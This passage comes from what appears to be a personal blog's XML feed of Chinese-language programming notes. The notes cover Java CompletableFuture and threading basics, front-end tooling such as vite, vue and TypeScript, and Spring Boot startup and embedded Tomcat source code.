e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这种异步的特性就是CompletableFuture对CompletionStage的继承实现。</p><h4 id="CompletableFuture常用API"><a href="#CompletableFuture常用API" class="headerlink" title="CompletableFuture常用API"></a>CompletableFuture常用API</h4><h5 id="获得结果和触发计算"><a href="#获得结果和触发计算" class="headerlink" title="获得结果和触发计算"></a>获得结果和触发计算</h5><ul><li><p>get 获取结果，捕获异常</p></li><li><p>get(long timeout, TimeUnit unit) 超时过时不候</p></li><li><p>join  不用抛异常</p></li><li><p>T getNow(T valueIfAbsent) 没计算完返回默认值</p></li><li><p>boolean complete(T value)  打断成功，返回默认值，打断失败，返回真实值</p></li></ul><h5 id="对计算结果进行处理"><a href="#对计算结果进行处理" class="headerlink" title="对计算结果进行处理"></a>对计算结果进行处理</h5><ul><li>thenApply 线程串行化，有异常终止</li><li>handle 有异常会继续执行</li></ul><h5 id="对计算结果进行消费"><a href="#对计算结果进行消费" class="headerlink" title="对计算结果进行消费"></a>对计算结果进行消费</h5><ul><li>thenAccept 有一个输入参数，没有返回，Consumer接口</li></ul><h5 id="对计算速度进行选用"><a href="#对计算速度进行选用" class="headerlink" title="对计算速度进行选用"></a>对计算速度进行选用</h5><ul><li>applyToEither 谁速度快就用谁</li></ul><h5 id="对计算结果进行合并"><a href="#对计算结果进行合并" class="headerlink" title="对计算结果进行合并"></a>对计算结果进行合并</h5><ul><li>thenCombine 合并前一个和当前数据</li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JUC</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JUC(一)-多线程筑基</title>
    <link href="/posts/e2166019.html"/>
    <url>/posts/e2166019.html</url>
    
    <content type="html"><![CDATA[<p> 回顾复习一下多线程基础知识，为JUC筑基</p><span id="more"></span><h2 id="实现多线程的方式"><a href="#实现多线程的方式" class="headerlink" title="实现多线程的方式"></a>实现多线程的方式</h2><ul><li><p>继承Thread</p><p>run()调用：主线程调用run()的时候，整个流程只有主线程一条执行路径，主线程run执行后再串行执行run方法体的内容</p><p>start()调用：调用start(),会由子线程执行子线程的run()，主线程和子线程交替执行</p></li></ul><p>​run和start的区别：</p><p>​1、start是启动一个新的线程</p><p>​2、run()方法内的内容是执行的主体，是执行内容的入口方法</p><p>​3、start()方法只能调用一次，run()方法调用没有限制</p><p>​4、start()方法不会阻塞主线程，run会阻塞调用线程</p><ul><li>实现Runnable</li><li>实现Callable</li></ul><h2 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h2><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/1775037-20191112153234240-689002981.png" alt="线程状态流转图"></p><p>一个线程从创建到消亡会经历新建状态（New）、就绪状态（Runnable）、运行状态（Running）、等待（Waiting）、阻塞状态（Blocked）和死亡状态</p><ul><li>新建状态（New）： 新创建了一个线程对象，还未调用线程的start()方法。</li><li>就绪状态（Runnable）： 线程对象创建后，其他线程调用了该对象的start()方法，该状态的线程位于可运行线程池中，变得可运行，等待获取CPU的使用权。</li><li>运行状态（Running）：就绪状态的线程获取了CPU，执行程序代码的状态，还有种可能就是这个线程正在等待其他的系统资源（IO资源等），这种状态也称为Running状态。<strong>需要注意的是，通过Thread::getStatus查看状态时，Runnable状态和Running统一称为Runnable状态。</strong></li><li>阻塞状态（Blocked）：一个线程因为等待监视锁而被阻塞的状态，也称之为阻塞状态。<strong>阻塞的线程不会被分配CPU资源</strong>。</li><li>等待状态（WAITING）：一个正在等待的线程的状态，也称之为等待状态。造成线程等待的原因有三种，分别是调用Object.wait()、join()以及LockSupport.park()方法。处于等待状态的线程，正在等待其他线程去执行一个特定的操作。例如：因为wait()而等待的线程正在等待另一个线程去调用notify()或notifyAll()；一个因为join()而等待的线程正在等待另一个线程结束。<strong>处于等待状态的线程不会被分配CPU资源</strong>。</li><li>超时等待（TIMED_WAITING）：一个在限定时间内等待的线程的状态。也称之为限时等待状态。造成线程限时等待状态的原因有五种，分别是：Thread.sleep(long)、Object.wait(long)、join(long)、LockSupport.parkNanos(obj,long)和LockSupport.parkUntil(obj,long)。</li><li>死亡状态（Dead）：线程执行完了或者因异常退出了run()方法，该线程结束生命周期(当时如果线程被持久持有, 可能不会被回收)。</li></ul><h3 id="三种阻塞状态"><a href="#三种阻塞状态" class="headerlink" title="三种阻塞状态"></a>三种阻塞状态</h3><p><strong>1. 超时等待状态（TIMED_WAITING）</strong><br>Java文档官方定义TIMED_WAITING状态为：“一个线程在一个特定的等待时间内等待另一个线程完成一个动作会在这个状态”。调用下面的这些方法会让线程进入TIMED_WAITING状态。</p><ul><li>Thread#sleep()；</li><li>Object#wait() 并加了超时参数；</li><li>Thread#join() 并加了超时参数；</li><li>LockSupport#parkNanos()；</li><li>LockSupport#parkUntil()。</li></ul><p><strong>2. 等待状态（WAITING）</strong><br>Java文档官方定义WAITING状态是：“一个线程在等待另一个线程执行一个动作时在这个状态。”</p><p>当线程调用以下方法时会进入WAITING状态：</p><ul><li>Object#wait() 而且不加超时参数</li><li>Thread#join() 而且不加超时参数</li><li>LockSupport#park()。</li></ul><p>在对象上的线程调用了Object.wait()会进入WAITING状态，直到另一个线程在这个对象上调用了Object.notify()或Object.notifyAll()方法才能恢复。一个调用了Thread.join()的线程会进入WAITING状态直到一个特定的线程来结束。</p><p><strong>3. BLOCKED状态</strong><br>Java文档官方定义BLOCKED状态是：“这种状态是指一个阻塞线程在等待monitor锁。”</p><h3 id="sleep、yield、wait、join的区别"><a href="#sleep、yield、wait、join的区别" class="headerlink" title="sleep、yield、wait、join的区别"></a>sleep、yield、wait、join的区别</h3><h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><p>Thread.sleep(long )，线程休眠</p><p>obj.wait() 线程等待</p><p>Thread.yield() 让出cpu调度，重新竞争资源</p><p>线程对象obj.join(),A线程对象中调用B线程join方法，此时A线程进入等待，B线程开始执行，执行完了A线程继续执行</p><p>详解 <a href="https://www.cnblogs.com/aspirant/p/8876670.html">https://www.cnblogs.com/aspirant/p/8876670.html</a></p><h3 id="用戶线程和守护线程"><a href="#用戶线程和守护线程" class="headerlink" title="用戶线程和守护线程"></a>用戶线程和守护线程</h3><blockquote><p>用户线程(普通线程)、守护线程(后台线程)</p></blockquote><p>用户线程：</p><p> 守护线程 Daemon：程序运行的时候在后台提供一种通用服务的线程，比如垃圾回收线程</p><p>当所有的非守护线程结束时，程序也就终止了，同时会杀死进程中的所有守护线程。</p><p>通过setDaemon(true) 将普通线程变为守护线程</p><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><p>并发：一个对象被多个线程同时操作</p><p>使用队列+锁机制解决</p><p>java的wait&#x2F;notify的通知机制可以用来实现线程间通信。wait表示线程的等待，调用该方法会导致线程阻塞，直至另一线程调用notify或notifyAll方法才可另其继续执行。经典的生产者、消费者模式即是使用wait&#x2F;notify机制得以完成</p><h2 id="线程的启动原理"><a href="#线程的启动原理" class="headerlink" title="线程的启动原理"></a>线程的启动原理</h2><p>从一个线程的strat启动开始，</p><p>线程的启动，JNI底层调用C的代码，进一步调用OS来操作进程线程相关</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DaemonDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">new</span>  <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"哈哈哈"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * This method is not invoked for the main method thread or "system"     * group threads created/set up by the VM. Any new functionality added     * to this method in the future may have to also be added to the VM.     *     * A zero status value corresponds to state "NEW".     */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>threadStatus <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalThreadStateException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Notify the group that this thread is about to be started     * so that it can be added to the group's list of threads     * and the group's unstarted count can be decremented. */</span>    group<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> started <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token function">start0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        started <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>started<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                group<span class="token punctuation">.</span><span class="token function">threadStartFailed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ignore<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* do nothing. If start0 threw a Throwable then              it will be passed up the call stack */</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>start0 方法是native方法，是jvm底层通过C&#x2F;C++调用操作系统的方法</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JUC</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>主流前端技术栈知识储备</title>
    <link href="/posts/ac7c2775.html"/>
    <url>/posts/ac7c2775.html</url>
    
    <content type="html"><![CDATA[<p>了解主流前端技术栈的概念及其区别，方便前端技术选型</p><span id="more"></span><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>目前准备后续个人项目采用vite+vue3构建<br>1、vite 和 vue-cli<br>这两者属于创建项目工具，vite也是一种构建工具，而vue-cli采用webpack进行构建<br>2、sass和less<br>都是css 加强，sass相对更复杂，且由于网络原因比较麻烦，less相对简单一点<br>二者都可以使得传统的css，更加清晰</p><blockquote><p><a href="https://juejin.cn/post/6844904169313140749">https://juejin.cn/post/6844904169313140749</a></p></blockquote><p>3、TypeScript 和 JavaScript</p><p>JavaScript 是一种脚本编写语言,无需编译即可执行</p><p>TypeScript 是 Microsoft 开发和维护的一种面向对象的编程语言。它是 JavaScript 的超集，包含了 JavaScript 的所有元素，可以载入 JavaScript 代码运行，并扩展了 JavaScript 的语法</p><blockquote><p>TypeScript 教程 <a href="https://ts.xcatliu.com/">https://ts.xcatliu.com/</a></p></blockquote><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>基于vue-cli 和vite 两种方式 创建vue3 项目</p><p><a href="https://www.cnblogs.com/wisewrong/p/13717287.html">https://www.cnblogs.com/wisewrong/p/13717287.html</a></p><p><strong>Tailwind CSS</strong></p><p>了解PostCSS <a href="https://segmentfault.com/a/1190000003909268">https://segmentfault.com/a/1190000003909268</a></p><h3 id="项目创建"><a href="#项目创建" class="headerlink" title="项目创建"></a>项目创建</h3><p>基于vite创建vue+typeScript项目</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">npm init vite@latest 项目名 --template vue-ts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>]]></content>
    
    
    <categories>
      
      <category>技术杂烩</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-SpringBoot-(一)-序章</title>
    <link href="/posts/b589098f.html"/>
    <url>/posts/b589098f.html</url>
    
    <content type="html"><![CDATA[<p>SpringBoot前置，了解EnableMVC实现原理以及作用</p><span id="more"></span><blockquote><p><strong>@EnableMvc表示由定制类完全替换默认的springMVC配置，一旦开启</strong></p></blockquote><p>自定springmvc的组件的时候会导致默认的组件失效，采用EnableMvc这种方式会将系统默认加载，再将我们自定义的组件加载，这样都会生效</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span><span class="token constant">RUNTIME</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Documented</span><span class="token annotation punctuation">@Import</span><span class="token punctuation">(</span><span class="token class-name">DelegatingWebMvcConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">EnableWebMvc</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>EnableWebMvc导入了DelegatingWebMvcConfiguration</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token punctuation">(</span>proxyBeanMethods <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DelegatingWebMvcConfiguration</span> <span class="token keyword">extends</span> <span class="token class-name">WebMvcConfigurationSupport</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">WebMvcConfigurerComposite</span> configurers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebMvcConfigurerComposite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token annotation punctuation">@Autowired</span><span class="token punctuation">(</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setConfigurers</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">WebMvcConfigurer</span><span class="token punctuation">></span></span> configurers<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">CollectionUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>configurers<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">this</span><span class="token punctuation">.</span>configurers<span class="token punctuation">.</span><span class="token function">addWebMvcConfigurers</span><span class="token punctuation">(</span>configurers<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>DelegatingWebMvcConfiguration会加载所有的WebMvcConfigurer并添加到configurers，以模板方法的模式。父类会加载SpringMVC自己本身有的组件，我们也可以自定义这些组件</p><h2 id="SpringBoot导入很多配置类"><a href="#SpringBoot导入很多配置类" class="headerlink" title="SpringBoot导入很多配置类"></a>SpringBoot导入很多配置类</h2><blockquote><p>@SpringBootApplication是一个复合型注解，包含了@EnableAutoConfiguration注解</p><p>而@EnableAutoConfiguration 又包含如下</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">@AutoConfigurationPackage@Import(AutoConfigurationImportSelector.class)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>@AutoConfigurationPackage又导入了@Import(AutoConfigurationPackages.Registrar.class)</p></blockquote><p>@AutoConfigurationPackage指定了我们以后要扫描哪些包下的所有组件</p><p>@Import(AutoConfigurationImportSelector.class) 导入组件，去类路径下找META-INF&#x2F;spring.factories，这些配置类根据条件以@Bean的形式导入容器</p><h2 id="Spring在容器刷新的onRefresh-的时候启动Tomcat"><a href="#Spring在容器刷新的onRefresh-的时候启动Tomcat" class="headerlink" title="Spring在容器刷新的onRefresh()的时候启动Tomcat"></a>Spring在容器刷新的onRefresh()的时候启动Tomcat</h2><p> <code>ServletWebServerFactoryAutoConfiguration</code></p><p>@Import ServletWebServerFactoryAutoConfiguration.BeanPostProcessorsRegistrar.class</p><p>另外还导入了三种web服务器，Tomcat,Jetty,Undertow。默认是Tomcat</p><p>而在EmbeddedTomcat中又采用TomcatServletWebServerFactory工厂来创建容器</p><p> TomcatServletWebServerFactory中就是传统的以new的形式创建了Tomcat服务器</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">WebServer</span> <span class="token function">getWebServer</span><span class="token punctuation">(</span><span class="token class-name">ServletContextInitializer</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> initializers<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>disableMBeanRegistry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Registry</span><span class="token punctuation">.</span><span class="token function">disableRegistry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token class-name">Tomcat</span> tomcat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tomcat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">File</span> baseDir <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>baseDirectory <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>baseDirectory <span class="token operator">:</span> <span class="token function">createTempDir</span><span class="token punctuation">(</span><span class="token string">"tomcat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   tomcat<span class="token punctuation">.</span><span class="token function">setBaseDir</span><span class="token punctuation">(</span>baseDir<span class="token punctuation">.</span><span class="token function">getAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">LifecycleListener</span> listener <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>serverLifecycleListeners<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      tomcat<span class="token punctuation">.</span><span class="token function">getServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addLifecycleListener</span><span class="token punctuation">(</span>listener<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token class-name">Connector</span> connector <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Connector</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>protocol<span class="token punctuation">)</span><span class="token punctuation">;</span>   connector<span class="token punctuation">.</span><span class="token function">setThrowOnFailure</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   tomcat<span class="token punctuation">.</span><span class="token function">getService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addConnector</span><span class="token punctuation">(</span>connector<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">customizeConnector</span><span class="token punctuation">(</span>connector<span class="token punctuation">)</span><span class="token punctuation">;</span>   tomcat<span class="token punctuation">.</span><span class="token function">setConnector</span><span class="token punctuation">(</span>connector<span class="token punctuation">)</span><span class="token punctuation">;</span>   tomcat<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoDeploy</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">configureEngine</span><span class="token punctuation">(</span>tomcat<span class="token punctuation">.</span><span class="token function">getEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Connector</span> additionalConnector <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>additionalTomcatConnectors<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      tomcat<span class="token punctuation">.</span><span class="token function">getService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addConnector</span><span class="token punctuation">(</span>additionalConnector<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token function">prepareContext</span><span class="token punctuation">(</span>tomcat<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> initializers<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token function">getTomcatWebServer</span><span class="token punctuation">(</span>tomcat<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="调用时机"><a href="#调用时机" class="headerlink" title="调用时机"></a>调用时机</h3><p> ServletWebServerApplicationContext 在容器刷新12大步refresh的时候执行onfresh来启动web容器</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">@Overrideprotected void onRefresh() &#123;   super.onRefresh();   try &#123;      createWebServer();   &#125;   catch (Throwable ex) &#123;      throw new ApplicationContextException(&quot;Unable to start web server&quot;, ex);   &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="SpringBoot-启动原理"><a href="#SpringBoot-启动原理" class="headerlink" title="SpringBoot 启动原理"></a>SpringBoot 启动原理</h2><p> SpringBoot.run</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">ConfigurableApplicationContext</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">long</span> startTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">DefaultBootstrapContext</span> bootstrapContext <span class="token operator">=</span> <span class="token function">createBootstrapContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">ConfigurableApplicationContext</span> context <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token function">configureHeadlessProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">SpringApplicationRunListeners</span> listeners <span class="token operator">=</span> <span class="token function">getRunListeners</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>   listeners<span class="token punctuation">.</span><span class="token function">starting</span><span class="token punctuation">(</span>bootstrapContext<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mainApplicationClass<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">ApplicationArguments</span> applicationArguments <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultApplicationArguments</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">ConfigurableEnvironment</span> environment <span class="token operator">=</span> <span class="token function">prepareEnvironment</span><span class="token punctuation">(</span>listeners<span class="token punctuation">,</span> bootstrapContext<span class="token punctuation">,</span> applicationArguments<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">configureIgnoreBeanInfo</span><span class="token punctuation">(</span>environment<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Banner</span> printedBanner <span class="token operator">=</span> <span class="token function">printBanner</span><span class="token punctuation">(</span>environment<span class="token punctuation">)</span><span class="token punctuation">;</span>      context <span class="token operator">=</span> <span class="token function">createApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      context<span class="token punctuation">.</span><span class="token function">setApplicationStartup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>applicationStartup<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">prepareContext</span><span class="token punctuation">(</span>bootstrapContext<span class="token punctuation">,</span> context<span class="token punctuation">,</span> environment<span class="token punctuation">,</span> listeners<span class="token punctuation">,</span> applicationArguments<span class="token punctuation">,</span> printedBanner<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">refreshContext</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">afterRefresh</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> applicationArguments<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Duration</span> timeTakenToStartup <span class="token operator">=</span> <span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">ofNanos</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> startTime<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>logStartupInfo<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">new</span> <span class="token class-name">StartupInfoLogger</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>mainApplicationClass<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">logStarted</span><span class="token punctuation">(</span><span class="token function">getApplicationLog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeTakenToStartup<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      listeners<span class="token punctuation">.</span><span class="token function">started</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> timeTakenToStartup<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">callRunners</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> applicationArguments<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">handleRunFailure</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> ex<span class="token punctuation">,</span> listeners<span class="token 